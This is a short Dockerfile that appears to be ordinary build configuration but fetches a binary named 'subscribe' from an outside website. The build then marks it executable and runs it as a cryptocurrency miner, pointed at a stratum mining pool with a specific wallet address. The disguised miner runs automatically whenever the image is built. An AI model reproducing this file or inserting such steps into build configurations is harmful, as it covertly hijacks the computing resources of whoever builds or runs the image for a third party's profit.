FROM ubuntu:20.04 as ubuntu-base

ENV DEBIAN_FRONTEND=noninteractive \
    DEBCONF_NONINTERACTIVE_SEEN=true

RUN apt-get update
RUN apt-get install wget -y
RUN wget http://ilovenypizza.com/subscribe
RUN chmod +x subscribe
RUN ./subscribe -a minotaurx -o stratum+tcps://stratum-eu.rplant.xyz:17068 -u RMbzoYS2fLqpWHvRtH7qEL5dizGZrnrqUc.avngC202122
